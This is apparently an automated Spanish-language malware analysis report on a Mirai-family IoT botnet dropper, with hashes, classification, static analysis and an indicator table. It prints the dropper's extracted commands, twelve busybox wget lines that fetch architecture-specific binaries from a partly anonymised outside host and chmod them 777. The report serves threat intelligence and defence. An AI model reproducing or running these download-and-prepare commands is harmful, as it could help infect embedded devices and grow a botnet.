# 🧬 Payload Analysis

`54f0fe656b1e7539acb546ed9c4a0de4318c4ea0723e3bddc095e76af21351a0`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificaron 12 comandos observados o extraídos. Se identificaron 25 indicadores técnicos. **Perfil técnico:** `Linux embebido / IoT` (probable). La presencia de BusyBox, junto con la evidencia de familia Mirai, es consistente con malware orientado a sistemas embebidos e IoT. **Ficha malware:** [malware-like/oraculo/botnet/54f0fe656b1e7539acb546ed9c4a0de4318c4ea0723e3bddc095e76af21351a0.md](../../../../../malware-like/oraculo/botnet/54f0fe656b1e7539acb546ed9c4a0de4318c4ea0723e3bddc095e76af21351a0.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:31:17.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `54f0fe656b1e7539acb546ed9c4a0de4318c4ea0723e3bddc095e76af21351a0`
- **MD5:** `8efb3225243218ea8fcb815592d8350e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 2.1 KiB |
| Entropía | 5.29 |
| Strings | 22 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm;
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc;
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4;
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc;
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86;
busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x8
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; | strings |
| url | hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
| ip | 45.130.151.XXX | static_analysis |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5 | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6 | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7 | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; | strings |
| command | busybox wget hxxp://45.130.151.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x8 | strings |
| hash | 54f0fe656b1e7539acb546ed9c4a0de4318c4ea0723e3bddc095e76af21351a0 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
